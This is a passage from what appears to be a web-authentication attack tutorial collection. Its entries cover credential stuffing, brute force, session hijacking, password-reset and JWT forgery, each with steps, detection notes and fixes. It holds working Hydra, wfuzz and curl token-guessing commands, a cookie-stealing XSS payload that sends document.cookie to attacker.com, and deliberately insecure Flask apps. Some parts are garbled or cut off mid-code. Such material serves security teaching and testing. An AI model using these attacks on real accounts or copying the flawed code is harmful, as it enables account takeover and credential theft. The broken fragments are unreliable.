. Step 5: Victim Uses WebView in App- The victim app has a WebView (like a help page, or embedded ad link).- The user clicks a link inside the app → it opens attacker’s webpage. Step 6: Session Cookies Auto-Sent in WebView- Because the WebView uses the same session (or shared storage), the malicious script runs inside the app’s WebView.- It sends the session cookie to the vulnerable API. Step 7: Server Accepts the Request- The API accepts the request because: - No CSRF token required - Session is valid - Origin header not checked. Step 8: User’s Data is Changed- Their password, profile, email, or account settings are changed.- They never saw it happen. Step 9: Confirm the Impact- Log out and try logging in with new password pwned987 — attacker now has access. Step 10: Other Common Targets- Hybrid banking apps- Health tracking apps- eCommerce apps built with Ionic or Cordova- SPAs using cookie-based sessions or embedded browser
Target Type: Mobile Hybrid Apps (WebView) / Single Page Applications (SPA)
Vulnerability: No CSRF validation + Cookie reuse + Lack of origin/referrer check
MITRE Technique: T1059.007 – JavaScript ExecutionT1530 – Data from Local System
Impact: - Account hijack- Password or settings changed- Email changed- Private data leaked- Silent actions from WebView
Detection Method: - Review server logs for unexpected requests from WebView-originated pages- Monitor mobile logs for background API requests- Use CORS & CSRF test tools like OWASP ZAP or Burp Suite CSRF plugin
Solution: ✅ Implement CSRF tokens even for mobile/SPA REST endpoints✅ Block credentials: include for external domains✅ Validate Origin and Referer headers on server✅ Don’t reuse cookies in WebViews (use access tokens)✅ Use SameSite=Strict on cookies wherever possible
Source: OWASP Mobile Testing Guide, PortSwigger SPA CSRF Labs, WebView Security Best Practices

Title: Credential Stuffing Attack
Scenario Description: Credential Stuffing is when an attacker uses a list of leaked usernames and passwords (from other hacked sites) and tries them automatically on another website. Since many people reuse passwords, some will work. Attackers use automation tools to try thousands of combinations quickly, looking for successful logins.
Tools Used: Burp Suite, Hydra, Ffuf, Selenium, SentryMBA, Crunch, DevTools, Text Editor
Attack Steps:
Step 1: Understand What You Need– This attack needs a list of leaked credentials (usually found on dark web or data breach sites).– You also need a target website’s login form (like https://bank.com/login). Step 2: Setup a Dummy Test Environment (Ethical Way)– Use a test server or try a legal lab like: https://tryhackme.com/room/credentialstuffing– Or set up a local login page using Flask or PHP. Step 3: Get a Username:Password List (Combo List)– Example format:john@example.com:password123admin@gmail.com:qwerty– Save it in a file like combo.txt. Step 4: Identify Login Request Pattern– Open the target login page– Use browser DevTools (F12 → Network tab)– Try a login manually and copy the POST request details: - URL - Parameter names (username, password) - Headers. Step 5: Use Hydra to Automate Attempts (Live Tool Example)– Install Hydra: sudo apt install hydra– Command example:bash
hydra -L usernames.txt -P passwords.txt https-post-form "/login:username=^USER^&password=^PASS^:Invalid login"
– This sends automatic login requests using each combo. Step 6: Watch for Successful Hits– Hydra will tell you if any credentials worked.– It will show something like: [80][http-post-form] host: target.com login: user@example.com password: welcome123. Step 7: Log In With Found Account– Manually go to the login page– Try using the working combo– You’re now logged in as that user. Step 8: (Optional) Use Burp Suite Intruder for Manual Replays– Open Burp → Proxy → Intercept Login Request– Send to Intruder– Set username/password as payloads– Start attack. Step 9: Real Targets (Ethically Tested Only!)– SaaS platforms– Banking logins– Shopping portals– Email services (webmail)– Admin dashboards. Step 10: Why This Works– People reuse passwords across websites.– Websites don’t rate-limit login attempts.– No 2FA (Two-Factor Authentication) means anyone can log in with just username + password.
Vulnerability: No rate-limiting, no CAPTCHA, password reuse, no 2FA
Impact: - Account takeover- Private data exposed- Identity theft- Financial fraud- Email or bank access
Detection Method: - Monitor login logs for repeated failed attempts from same IP- Look for multiple logins to different accounts from same IP/device- Detect unusual login times or locations
Solution: ✅ Implement rate-limiting on login attempts✅ Use CAPTCHA after a few failed attempts✅ Enforce multi-factor authentication (2FA)✅ Monitor for credential stuffing behavior (WAF, anomaly detection)✅ Block known leaked credentials using services like HaveIBeenPwned API
Source: OWASP Top 10, TryHackMe Credential Stuffing Lab, MITRE ATT&CK, PortSwigger Guide to Brute Force

Title: Brute-Force Login Attack
Scenario Description: In this attack, an attacker guesses a user's password by trying many possible passwords over and over again on the login form until one works. This is done manually or using automated tools. If a website does not limit login attempts or block after several wrong tries, it's vulnerable. Attackers often use password lists (wordlists) and tools like Hydra, Burp Suite, or Python scripts to automate the guessing.
Tools Used: Hydra, Burp Suite, Python, DevTools, Wordlists (rockyou.txt, etc.)
Attack Steps:
Step 1: Understand the Goal- You’re trying to guess a password by testing many until the correct one is found.- This is often used when: - The username is known (admin, user1, etc.) - The password is weak or reused (123456, password, etc.). Step 2: Set Up a Legal Test Environment (So You Don’t Break Laws)- Use TryHackMe's Brute Force Room: https://tryhackme.com/room/bruteforce- Or set up a Flask/PHP dummy login page on localhost. Step 3: Identify the Login Form- Visit the login page of the target/test app (e.g., http://127.0.0.1:5000/login)- Press F12 → Network tab → Submit a login form once with fake values.- Find the request method (usually POST) and parameters: Example: - URL: /login - Params: username, password. Step 4: Get a Wordlist- Use rockyou.txt or create your own: echo -e "admin 123456 password admin123 qwerty" > passlist.txt. Step 5: Use Hydra for the Brute-ForceInstall Hydra:sudo apt install hydraRun Hydra command:bash
hydra -l admin -P passlist.txt http-post-form "/login:username=^USER^&password=^PASS^:Invalid" -V
- -l = username- -P = password list- /login = path- Invalid = the message shown when login failsHydra tries every password in passlist.txt for user admin. If one works, you’ll see:[80][http-post-form] host: 127.0.0.1 login: admin password: admin123. Step 6: Log In With the Cracked Password- Go to the login form and use the found password- You’re now inside the account. Step 7: Optional – Use Burp Suite Intruder- Open Burp Suite → Turn on Intercept- Login manually and capture the request- Send it to Intruder- Set the password field as the payload position- Load the passlist.txt wordlist- Start attack- See which request returns “200 OK” or a different response → that’s a valid login. Step 8: Why This Works- Websites don’t block or slow down repeated failed logins- Weak or common passwords are used- No CAPTCHA or rate-limiting exists. Step 9: Real-World Use- Email login- Admin portals- cPanel logins- WordPress wp-login- Cloud dashboards (AWS, GCP, etc.)
Target Type: Login Forms, Web Portals, Admin Panels
Vulnerability: No rate-limiting, No CAPTCHA, Weak Passwords, Reused Credentials
Impact: - Account hacked- Sensitive data stolen- Email or financial access- Identity theft- Escalation to internal network compromise
Detection Method: - Monitor login logs: excessive failed attempts- Check for repeated login from one IP- Flag too many logins in short time- Web server logs (e.g., Nginx, Apache) will show brute-force patterns
Solution: ✅ Limit login attempts✅ Use CAPTCHA after 3-5 failed logins✅ Implement account lockout✅ Enforce strong password policy✅ Use 2FA/MFA✅ Monitor login traffic with security alerts and tools like Fail2Ban or WAF
Source: OWASP Brute Force Guide, MITRE ATT&CK, TryHackMe Brute Force Room, PortSwigger Blog

Title: Username Enumeration
Scenario Description: This attack reveals valid usernames by looking at how a website responds to login or signup attempts. If the message says "User does not exist" vs "Wrong password," an attacker learns which usernames are real. This can help with brute-force, phishing, or targeted attacks. It often happens in login, registration, forgot password, or reset forms.
Tools Used: Browser DevTools, Burp Suite, curl, wfuzz, test login form
Attack Steps:
Step 1: Understand the GoalYou want to know if a username exists on a website.Websites often give different error messages for valid and invalid usernames.Example:- Invalid username → Username doesn’t exist- Wrong password → Username exists! Step 2: Use a Legal Testing Site- TryHackMe: https://tryhackme.com/room/owaspbrokenauth- Or create a local test app (Flask/PHP) with a login form. Step 3: Open Login Page and DevTools- Go to the target login page (like http://localhost/login)- Open browser → Press F12 → Network tab- Submit login with: Username: fakeuser Password: anythingLook for response message or status: If message is "User does not exist" → Enumeration is possible. Try a real user like admin → See if the message changes to "Wrong password". Step 4: Try with Burp Suite (More Powerful)- Turn on Burp Intercept- Submit a fake login- Send to Intruder- Set username field as payload- Use a wordlist (e.g., usernames.txt) with names like:admin, user1, john, mike- Run the attack Check the response length or message If different responses occur for some users → They are valid. Step 5: Try Forgot Password Formwfuzz -u http://example.com/login -d "username=FUZZ&password=test" -w usernames.txt --hh 20
- It shows which usernames return different-sized responses (i.e., valid users). Step 7: Why This Is Dangerous- Helps attackers prepare for brute-force or phishing- May reveal admin or test users- Allows targeted attacks on real users. Step 8: Real Targets (Only in Testing)- Login forms- Forgot password pages- Registration forms with “username already exists” messages
Target Type: Login forms, password reset, registration pages
Impact: - Leads to brute-force attacks- Enables phishing- Identifies admin/test accounts- Helps attacker reduce guesses
Detection Method: - Monitor failed login attempts per IP- Look for repeated username checks- Inspect logs with login status analysis tools- Web server logs: 401/403 status patterns
Solution: ✅ Show same error message for all login failures✅ Always return generic error like: "Invalid credentials"✅ Use rate-limiting and CAPTCHA✅ Delay response time slightly (throttling)✅ Alert on too many username lookups or password resets
Source: OWASP Broken Authentication, TryHackMe Broken Auth Room, PortSwigger Blog

Title: Session Fixation Attack
Scenario Description: In this attack, the attacker tricks the victim into using a session ID chosen by the attacker. If the application does not regenerate the session ID after login, the attacker can later use the same session to access the victim’s account. It's like giving someone a key and then using a copy of that key later to enter their account. This is especially risky in apps that accept session IDs in the URL or allow pre-authentication cookies.
Tools Used: Burp Suite, Firefox, Chrome, Flask/PHP app, Intercepting Proxy
Attack Steps: Step 1: Understand the Goal- You want the victim to log in using your session ID so that after login, you can hijack their session using the same ID.- This works if the app does not change the session ID after login.Step 2: Create or Use a Vulnerable Web App- You can use OWASP's vulnerable app: https://owasp.org/www-project-webgoat/- Or create a basic Flask app (I'll give one below). Step 3: Open Burp Suite and Intercept Login Request- Set up Burp Proxy in Firefox- Go to the login page (http://localhost:5000/login)- Intercept the login request using Burp Suite- Check if there is a session ID (like sessionid or PHPSESSID) in the cookie. Step 4: Fix the Session ID Before Login (Attacker’s Step)- As the attacker, visit the login page (before victim logs in)- Copy your session ID from browser cookies (use DevTools → Application tab → Cookies)- Send this session ID to the victim (via phishing link or iframe or manually)Example: http://localhost:5000/login?sessionid=abc123. Step 5: Victim Logs In Using the Same Session ID- Victim clicks the attacker's link and logs in- The app keeps the same session ID after login . Step 6: Attacker Reuses the Session- Now the attacker reuses the same session ID (abc123)- Opens a browser → Sets the cookie sessionid=abc123- Visits the app → Now logged in as the victim. Step 7: You Successfully Hijacked the Session- The attacker has full access without knowing username or password- Works because session wasn’t regenerated after login. Step 8: Optional (Try in Flask App – Example Below)- Flask app uses session['user'] with no session refresh after login- Add a fake session ID like abc123 before login- Watch it stay the same after login (bad!)
Target Type: Web applications using cookies or session in URL
Vulnerability: Session ID not regenerated after login, accepts fixed ID from attacker
Impact: - Full account takeover- No need to guess password- Bypasses authentication- May lead to privilege escalation
Detection Method: - Monitor for repeated session ID reuse across accounts- Check logs for shared session ID usage from different IPs- Burp or ZAP can simulate this behavior
Solution: ✅ Always regenerate session ID after login✅ Never accept session IDs via GET or from user input✅ Use HttpOnly, Secure, SameSite=Strict cookies✅ Set session expiration✅ Use strong session management libraries
Source: OWASP Session Fixation Cheat Sheet, PortSwigger Web Security Academy, OWASP WebGoat

Title: Session Hijacking
Scenario Description: In this attack, an attacker steals a session ID (usually stored in cookies) and uses it to impersonate a logged-in user. It’s like copying someone’s key and using it to enter their account. This can happen if the session ID is exposed via insecure cookies, network sniffing, XSS, or URL leakage. If the app doesn't validate user behavior, it cannot detect this impersonation.
Tools Used: Wireshark, Burp Suite, DevTools, Python Flask, OWASP WebGoat
Attack Steps: Step 1: Understand the Goal- You're trying to steal and reuse a session ID (the key that proves someone is logged in)- If you get this ID, you don’t need the password. Step 2: Use a Vulnerable Environment- Use OWASP WebGoat or a test Flask app (provided below)- Or use TryHackMe’s “OWASP Top 10” Room which includes this topic. Step 3: Simulate Victim Logging In- Open browser (Victim)- Visit http://127.0.0.1:5000/login- Login using: user:admin + pass:admin123- Go to DevTools > Application > Cookies- Note the cookie named session or sessionidExample: session=abc123xyz. Step 4: Simulate Attacker Stealing the Cookie. Option 1: Manually (for learning)- Copy the cookie value from victim browser- Paste it into attacker’s browser (DevTools > Application > Cookies)- Refresh page. Option 2: XSS (if app has it)- Use payload like:<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>- This sends the victim's cookie to attacker. Option 3: Sniff Traffic with Wireshark- If on same Wi-Fi + HTTP (not HTTPS), sniff with: http.request.cookie- Capture cookies and replay them. Step 5: Replay the Session- Paste stolen session ID in your browser cookies- Visit http://127.0.0.1:5000/profile. You're now logged in as victim without password! Step 6: Bonus – Simulate in Flask App Below- Use two browser profiles: 1. Victim logs in 2. Copy cookie value 3. Attacker pastes same value in their browser 4. Attacker is logged in. Step 7: Why This Works- Sessions are not tied to IP/device- No session expiration- Cookies are not HttpOnly or Secure- Traffic is not encrypted (HTTP)
Target Type: Web Apps, APIs, Single-Page Apps, Admin Portals
Vulnerability: Insecure session management, session ID leakage, no regeneration
Impact: - Full account access- Bypass login- Identity theft- Possible privilege escalation or financial theft
Detection Method: - Monitor login from different IPs/devices using same session ID- Detect session reuse patterns- Use session replay detection and session fingerprinting systems
Solution: ✅ Regenerate session ID after login✅ Use HttpOnly, Secure, and SameSite attributes on cookies✅ Use HTTPS only✅ Tie session to IP/device fingerprint✅ Use short session expiry and inactivity timeout
Source: OWASP Session Management Guide, PortSwigger Academy, OWASP WebGoat, TryHackMe OWASP Lab

Title: Insecure Password Reset
Scenario Description: This attack targets weak or poorly implemented password reset functions. Examples include:- Predictable reset tokens- No token expiration- No user verification- Email-based reset leaksAttackers exploit these to reset the victim’s password and take over the account — without knowing the current password. It’s like tricking a lock into giving you a new key without any proof of ownership.
Tools Used: Browser DevTools, Burp Suite, Flask test app, Wordlists, Python
Attack Steps:
Step 1: Understand the Goal- Reset the password of a user account (e.g., admin) without access to their email.- Exploit flaws in how the system validates or handles password reset requests. Step 2: Use Legal Testing Lab or Flask App (Below)- You can use OWASP WebGoat or TryHackMe’s Insecure App- OR simulate it using Flask (see Flask app below). Step 3: Explore the Password Reset Page- Go to /reset-password- Enter the victim’s username or email (e.g., admin)- Look at the URL with reset token: E.g., /reset?token=abc123. Step 4: Check for Token Predictability or Guessing- Try changing abc123 to abc124, admin123, etc.- If you find a working token → login reset is possible- You can also brute-force token using a wordlist:bash
for t in $(cat wordlist.txt); do
curl "http://localhost:5000/reset?token=$t"
done
. Step 5: If No Verification Exists…- Many bad apps allow password change without checking email or OTP- If attacker has token or reset link, they can set new password directly. Step 6: Exploit Insecure Implementation. Reset password using guessed link. Login with new password. Step 7: Success- You’ve reset victim’s account- No login credentials or email access needed!. Optional: Look for Other Weaknesses- No token expiry- Reusable links- Guessable tokens- No rate-limiting
Target Type: Login Systems, User Management, Forgot Password pages
Vulnerability: Predictable reset tokens, no validation, no expiry, user ID exposure
MITRE Technique: T1589.002 – Email Address EnumerationT1203 – Exploitation for Privilege Escalation
Impact: - Account Takeover- Unauthorized access- Identity theft- Loss of customer trust
Detection Method: - Monitor reset token generation- Look for multiple reset attempts from one IP- Check logs for repeated token guesses
Solution: ✅ Use secure, random, unguessable tokens✅ Set token expiry (e.g., 10 minutes)✅ Verify identity before password change (email or OTP)✅ Don’t expose reset links in logs or URLs✅ Use CAPTCHA on reset forms
Source: OWASP Password Reset Cheat Sheet, PortSwigger Academy, TryHackMe OWASP Lab, OWASP WebGoat

Title: Default Credentials Attack
Scenario Description: Many applications, routers, IoT devices, and admin dashboards come with pre-set usernames and passwords like admin:admin, root:toor, etc. If the user never changes them, attackers can log in using these defaults. This attack is simple and effective, especially against poorly maintained apps or test systems.
Tools Used: Browser, Burp Suite, Hydra, Curl, Flask vulnerable app
Attack Steps:
Step 1: Understand the Goal- Try to log in to a system using factory default credentials like: • admin:admin • root:toor • guest:guest- You don’t need to guess — these are public and widely known. Step 2: Use a Target App or Simulation. You can use: • TryHackMe → “Common Credentials” room • DVWA (Damn Vulnerable Web App) • Our Flask test app (below). Step 3: Open the Login Page- Visit: http://127.0.0.1:5000/login- Look at the login form fields (username, password). Step 4: Try Common Combinations. Try these in the form: • admin:admin • root:root • user:user. Step 5: Brute Force with Wordlist (Optional)- Use Burp Suite's Intruder or Hydra tool- Wordlist examples: admin root guest Passwords: admin 1234 password ````
- Use this with Hydra:
bash hydra -l admin -P passwords.txt http-post-form "/login:username=^USER^&password=^PASS^:Invalid" ```. Step 6: If Login Works → You Win- The app didn’t force a password change- You’re logged in without hacking anything. Step 7: Change Settings or Escalate- Try going to /admin or change profile details- In real systems, this leads to full server/device access
Target Type: Any app/device that uses login (routers, CMS, APIs, admin portals)
Impact: - Full account control- System takeover- Data breach- Privilege escalation
Detection Method: - Monitor logins with known default usernames- Alert when admin or guest log in- Track failed login attempts from known IPs
Solution: ✅ Always force password change on first login✅ Disable or delete default accounts✅ Enforce password complexity rules✅ Monitor login events✅ Block access to /admin if unused
Source: OWASP Top 10, PortSwigger Academy, OWASP Juice Shop, TryHackMe Common Credentials room

Title: Weak Password Policy Attack
Scenario Description: When websites or apps let users set weak passwords like 1234, abcd, or password, it becomes very easy for attackers to guess or brute-force accounts. This is because the system has no rules enforcing strong passwords (e.g., length, special characters, etc.). Attackers use wordlists to guess these common weak passwords.
Tools Used: Flask, Burp Suite, Hydra, Common Wordlists, DevTools
Attack Steps:
Step 1: Understand the Goal- We are going to break into an account by guessing weak passwords because the system allows users to set them.- No password strength checks are in place.. Step 2: Use a Practice App (Flask below)- Use the Flask app provided later to simulate login and signup with weak passwords.- OR TryHackMe → Weak Passwords Room. Step 3: Open the Signup Page- Go to http://127.0.0.1:5000/signup- Create user: victim- Password: 1234 ( Accepted even though it's weak)- Login works — system has no password rules!. Step 4: Simulate Attack as Attacker- Open the login page- Try these weak passwords: • 1234 • password • admin. Step 5: Brute Force with Wordlist (Optional)Use Burp Suite or Hydra with a list of weak passwords:bash
hydra -l victim -P weak.txt localhost http-post-form "/login:username=^USER^&password=^PASS^:Invalid"
Sample weak.txt:
1234
password
abcd
qwerty
letmein
. Step 6: If a Weak Password Works- You are logged in as the victim- This proves the system is vulnerable. Step 7: Why It’s Dangerous- If many users choose weak passwords- One attack can break multiple accounts- No 2FA, no lockouts = high risk!
Target Type: Any login-enabled system – websites, APIs, mobile apps
Vulnerability: Weak password policy (no strength rules, no complexity, short length)
Impact: - Unauthorized access- Full account control- Credential stuffing- Internal data leaks
Detection Method: - Log analysis showing repeated login attempts- Detect use of common password patterns- Look for reused passwords across users
Solution: ✅ Enforce strong password policy: - Min. 8–12 chars - Use numbers, symbols, caps✅ Use password strength meters✅ Block common passwords (password, 1234)✅ Enable account lockouts after failed attempts✅ Enable 2FA
Source: OWASP Password Policy Guide, TryHackMe Weak Credentials, PortSwigger Academy

Title: Broken Multi-Factor Authentication
Scenario Description: MFA (Multi-Factor Authentication) is meant to protect accounts by requiring a second factor (e.g., OTP or email code). When developers misconfigure it (e.g., allow bypassing, reuse of OTPs, or verify MFA before password), attackers can log in without the real second factor. This attack simulates those flaws to bypass MFA protections.
Tools Used: Flask, Browser DevTools, Burp Suite, Custom OTP Test App
Attack Steps: Step 1: Understand the Goal- Try to bypass 2FA to log into an account without entering the valid second factor.- This can happen due to mistakes in MFA logic like: • OTP verified before login • OTP never expires • MFA optional. Step 2: Use a Legal Test App (Flask below)We’ll simulate a weak MFA using a Flask app: - Username + password → OK - OTP is shown on screen (not emailed) - OTP doesn’t expire - OTP is same for every user. Step 3: Create Victim AccountVisit /register • Username: victim • Password: password123 • You will get an OTP: 111111. Step 4: Try Login As Attacker1. Go to /login2. Enter victim and password1233. System asks for OTP4. Try bypass: Enter 111111 (the default, static OTP)  OR skip OTP step via modified request (Burp Suite). Step 5: Use Burp Suite (Optional)- Intercept POST request after login form- Modify MFA step or skip- OR try reusing old OTP. Step 6: SuccessYou're now logged in as victim without a secure MFA. Step 7: Why This Happens- OTP never changes- MFA is checked before password- No rate limit or OTP expiry- OTP not linked to session properly
Target Type: Web apps with login + MFA (email/SMS/OTP) flows
Vulnerability: Static or reusable OTP, OTP before password, optional 2FA, missing expiry
Impact: - Account Takeover- Full access to user account- Violation of security trust
Detection Method: - Detect repeated logins using same OTP- Track OTP reuse- Check for login without MFA- Use logs to detect session OTP mismatch
Solution: ✅ Link OTP to session✅ One-time OTP with expiry (2–5 minutes)✅ OTP after correct password✅ Expire OTP on reuse✅ Enable audit logs and alerts for repeated failures
Source: OWASP Authentication Cheat Sheet, PortSwigger Academy, TryHackMe Broken Auth, Custom Flask Labs

Title: Bypassing Authentication Logic Flaws
Attack Type: Auth Bypass via Insecure Logic Flow
Scenario Description: Authentication logic flaws happen when the developer makes a mistake in how login is verified. For example, the app may look for user=admin in a cookie or trust a query parameter like ?admin=true. An attacker can change this value directly in the browser to gain unauthorized access without knowing any password.
Tools Used: Flask App, Browser DevTools, Burp Suite
Attack Steps: Step 1: Understand the GoalWe want to bypass the login even if we don't know the password, by tricking the logic the app uses to decide whether someone is logged in. Step 2: Launch the Flask App (Below)- App uses insecure logic: • If query parameter ?auth=true is present, the user is considered “logged in”. Step 3: Visit /dashboard Normally- You’ll see Access Denied because you're not logged in. Step 4: Bypass the Logic- In browser, go to: http://127.0.0.1:5000/dashboard?auth=true- Boom. You’re now “logged in” without password. Alternate Simulation (Cookie Bypass)1. Go to /login, enter any username and password (no check is done)2. The app sets a cookie: auth=true3. You can now directly visit /dashboard or manually set auth=true in cookies. Optional Advanced Step (Burp Suite)- Intercept the login POST request- Change parameters like role=user to role=admin- Resend and see if you're treated as admin. Why This is Dangerous- Attackers can gain access to pages without valid credentials- Might escalate to admin without password- No brute force needed
Target Type: Web apps with poor logic in login or role checks (e.g., old CMS, admin panels)
Vulnerability: Trusting query parameters or cookies for auth instead of secure server-side checks
MITRE Technique: T1078 – Valid AccountsT1203 – Exploitation for Client Execution
Impact: - Full account takeover- Admin access- Business logic abuse- No brute-force needed
Detection Method: - Monitor for suspicious query parameters or cookies- Review server logs for unauthorized access with unusual values
Solution: ✅ Always store session state on the server side✅ Never trust query parameters or client-side cookies for auth✅ Use proper session IDs and tokens✅ Add backend checks (e.g., database role validation)
Source: OWASP Broken Access Control Guide, PortSwigger Logic Flaws Academy, Flask Demo Labs

Title: JWT Authentication Bypass
Scenario Description: JWT (JSON Web Token) is used to prove you're logged in. But if the server is misconfigured (e.g., uses none algorithm or leaks the secret key), an attacker can modify the token and forge fake admin access. This simulation shows how you can manipulate a JWT to gain unauthorized access, even without knowing a password.
Tools Used: Flask App, Postman, DevTools, jwt.io, Burp Suite
Attack Steps: Step 1: Understand JWT- JWT = JSON Web Token. It contains data like username/role, and is cryptographically signed.- Structure: header.payload.signature (3 parts)- Example:eyJhbGciOiAiSFMyNTYifQ.eyJ1c2VybmFtZSI6ICJhZG1pbiJ9.signature- It’s sent in request headers like:Authorization: Bearer <JWT>. Step 2: Use the Vulnerable Flask App (code below)- It uses hardcoded JWT secret- Or accepts JWTs signed with none (no signature check!). Step 3: Register/Login Normally1. Visit /login2. Login with: - Username: user - Password: pass3. You get a JWT token like:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoidXNlciJ9.signature. Step 4: Modify JWTUse https://jwt.io:- Paste your token- Change role from user → admin in the payload- Then either:  Re-sign with known secret (secret123)  OR set header algorithm to "none" (some servers skip signature!). Step 5: Send Modified Token- In Postman or Burp: - URL: http://127.0.0.1:5000/dashboard - Add header:Authorization: Bearer <your fake JWT>. Now you are treated as admin without a real account!. Step 6: Real-World Examples- Some apps accidentally trust "alg": "none" and skip verification- Others leak their secret (e.g., in GitHub code)- JWTs that aren't expired can be reused forever if not checked
Target Type: Web apps or APIs using JWT for login/auth
Vulnerability: Insecure JWT implementation (alg=none, leaked key, missing expiration, no validation)

Solution: ✅ Do NOT allow alg: none✅ Use strong, rotating secret keys✅ Validate signature & expiration on every request✅ Use short expiry (e.g., 15 mins)✅ Log and alert on invalid tokens
Source: OWASP JWT Cheat Sheet, PortSwigger Academy, jwt.io Labs, TryHackMe JWT Playground

We simulate how an attacker can use a tool like Wireshark to capture and read login credentials.
Tools Used: Flask App (HTTP), Wireshark, Burp Suite (optional), Browser, Public Wi-Fi (optional)
Attack Steps:
Step 1: Understand the Risk- Without HTTPS, data between your browser and the server is not encrypted.- Anyone watching the network can see what you send, like passwords, email, etc. Step 2: Launch the Vulnerable Flask AppUse the Python app below that runs only on HTTP (not HTTPS).bash
python http_login_app.py
. Step 3: Open Wireshark- Start Wireshark- Choose your network interface (Wi-Fi, Ethernet, etc.)- Apply this filter to show only HTTP:http- Start capturing. Step 4: Visit the Login PageGo to:http://127.0.0.1:5000/loginEnter:- Username: victim- Password: secret123Submit the form. Step 5: Capture and Read Password- In Wireshark, find a packet with method POST /login- Right-click → Follow → HTTP Stream- You will see:\nusername=victim&password=secret123- Plain text credentials exposed. Optionally, use Burp Suite to intercept and observe the same traffic (also in plain text). Target Type: Web apps, mobile APIs, IoT devices using plain HTTP
Vulnerability: No HTTPS (SSL/TLS) encryption in data transmission

Source: OWASP Transport Layer Protection Cheat Sheet, Wireshark Docs, Mozilla Security Guidelines

Title: Unencrypted Data at Rest (Plaintext Storage)

Title: Weak or No Password Hashing
Scenario Description: If a web application stores passwords in the database without hashing, or uses weak hashes like MD5 or SHA1, an attacker who steals the database can easily crack the passwords using tools like Hashcat or John the Ripper. This simulation shows how to retrieve and crack plaintext or weakly hashed passwords with real tools on your own computer.
Tools Used: Flask, SQLite, Python, Hashcat (or CrackStation), VS Code, Terminal
Attack Steps:
Step 1: Understand Password Hashing- Password hashing = one-way transformation- Strong hash = slow to compute (e.g., bcrypt, Argon2)- Weak hash = fast to compute (e.g., MD5, SHA1) and easy to crack- No hash = plain text stored. Step 2: Create a Flask App That Uses Weak Hashing (MD5)Save this as weak_hash_app.py:python
from flask import Flask, request
import sqlite3, hashlib

app = Flask(__name__)

conn = sqlite3.connect('users.db')
conn.execute("CREATE TABLE IF NOT EXISTS users (username TEXT, password TEXT)")
conn.close()

@app.route('/register', methods=['POST'])
def register():
data = request.json
weak_hash = hashlib.md5(data['password'].encode()).hexdigest()
conn = sqlite3.connect('users.db')
conn.execute("INSERT INTO users (username, password) VALUES (?, ?)", (data['username'], weak_hash))
conn.commit()
conn.close()
return {"message": "Registered!"}

if __name__ == '__main__':
app.run(debug=True)
. Step 3: Run the Appbash
python weak_hash_app.py
. Step 4: Register a Victim UserUse curl or Postman:bash
curl -X POST http://127.0.0.1:5000/register -H "Content-Type: application/json" -d "{\"username\":\"victim\",\"password\":\"123456\"}"
. Step 5: Attacker Accesses the DBOpen Python:python
import sqlite3
conn = sqlite3.connect('users.db')
for row in conn.execute("SELECT * FROM users"):
print(row)
You’ll see:('victim', 'e10adc3949ba59abbe56e057f20f883e') → This is MD5("123456"). Step 6: Crack the Hash Using CrackStation or Hashcat- Go to https://crackstation.net- Paste the MD5 hash: e10adc3949ba59abbe56e057f20f883e. It will tell you: 123456OR use Hashcat (optional, advanced):bash
hashcat -m 0 hashes.txt rockyou.txt
. Step 7: Real-World Impact- Millions of breached passwords are cracked this way (e.g., from leaked DB dumps)- Even weak hash → instant crack- No hash = immediate compromise
Target Type: Web apps with database storing hashed or plaintext passwords
Vulnerability: Use of weak hashes (MD5, SHA1) or storing passwords in plaintext
Impact: - Account takeover- Password reuse attack across platforms- Massive credential stuffing campaigns- Legal or regulatory violations (e.g., GDPR fines)
Detection Method: - Review DB contents for weak hash algorithms (look for MD5/SHA1)- Audit hashing libraries in codebase- Use tools like truffleHog or regex search to detect insecure hashes in code or repos
Solution: ✅ Use strong hash algorithms (bcrypt, scrypt, Argon2)✅ Add salt to hashes✅ NEVER use MD5/SHA1 for passwords✅ Require long, complex passwords to increase hash strength✅ Encrypt the DB if storing sensitive data
Source: OWASP Password Storage Cheat Sheet, CrackStation, Hashcat Docs, PortSwigger, TryHackMe

Step 2: Set Up a Vulnerable Flask AppCreate a new file vuln_url_flask.py:python
from flask import Flask, request

'

"

Step 5: Simulate an AttackerImagine someone has access to: Browser history. Apache/Nginx server logs. Proxy/Wi-Fi access logsThey can see this full URL:/reset?token=abc123&email=victim@gmail.comThey copy-paste that link and can reset the victim’s password. Source: OWASP A01:2021, PortSwigger Academy, Mozilla Dev Docs, TryHackMe, Web Security Academy

Title: Insecure JWT or Token Management
Scenario Description: JWTs (JSON Web Tokens) are used for authentication. If not stored, validated, or rotated properly, an attacker can reuse, forge, or steal them. Common mistakes include not validating signature, using weak secrets, allowing alg: none, or not setting expiry. This simulation shows how to tamper or misuse insecure JWTs to impersonate users/admins.
Tools Used: Flask App, Postman, DevTools, jwt.io, Python (PyJWT), VS Code, Browser Console
Attack Steps:
Step 1: Understand How JWT Works- JWT = token with 3 parts: header.payload.signature- Sent via Authorization: Bearer - Contains data like username/roleExample:eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.signature. Step 2: Create a Vulnerable Flask Apppython
from flask import Flask, request, jsonify
import jwt

app = Flask(__name__)
SECRET_KEY = "weakkey123" . weak secret!

@app.route("/token", methods=["POST"])
def get_token():
data = request.get_json()
token = jwt.encode(data, SECRET_KEY, algorithm="HS256")
return jsonify({ "token": token })

@app.route("/protected")
def protected():
token = request.headers.get("Authorization").split(" ")[1]
data = jwt.decode(token, SECRET_KEY, algorithms=["HS256"])
return jsonify({ "msg": f"Hello {data['username']}!" })

if __name__ == "__main__":
app.run(debug=True)
.This app uses a weak secret and no token expiry. Step 3: Run the Appbash
python vuln_jwt.py
It runs at: http://127.0.0.1:5000. Step 4: Generate a JWT TokenUse Postman:- POST to: http://127.0.0.1:5000/token- Body (raw → JSON):json
{ "username": "user", "role": "user" }
